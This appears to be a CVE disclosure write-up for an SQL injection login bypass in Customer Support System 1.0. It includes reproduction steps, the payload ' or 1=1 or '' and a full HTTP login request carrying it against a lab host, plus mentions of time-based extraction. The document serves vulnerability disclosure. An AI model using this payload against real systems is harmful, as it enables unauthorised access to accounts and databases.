# CVE-2023-49547
# Customer Support System 1.0 - SQL Injection Login Bypass

**Description**: Customer Support System is vulnerable 1.0 to SQL Injection. A SQL injection vulnerability in Customer Support System 1.0 enables remote, unauthenticated attackers to bypass the authentication process by exploiting the username parameter.  
  
**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49547     
**Tested on**: Windows  
### Steps to reproduce:  
1. Visit the login page.
2. Upon making the request, insert the malicious payload (' or 1=1 or '') in the username parameter.
3. In addition to authentication bypass, it is possible to extract information from the database using time-based and boolean-based attacks.

Request: Authentication bypass:
```
POST /customer_support/ajax.php?action=login HTTP/1.1
Host: 192.168.68.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 54
Origin: http://192.168.68.148
Connection: close
Referer: http://192.168.68.148/customer_support/login.php
Cookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko; sessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq; PHPSESSID=abige9ar0b1bi3qcf9mkv258o3

username='+or+1%3D1+or+''%3D'&password=password&type=1
```
Time Based:
20 seconds
![time01](https://github.com/geraldoalcantara/SQLi-Login-Customer_Support_System/assets/152064551/3c49c314-867d-4f71-a434-3d9b2241711a)

Time Based:
2 seconds
![time02](https://github.com/geraldoalcantara/SQLi-Login-Customer_Support_System/assets/152064551/f4fb16a2-81df-4574-89b1-dcbf026aa0b9)

Discoverer(s)/Credits:  
Geraldo Alcântara  
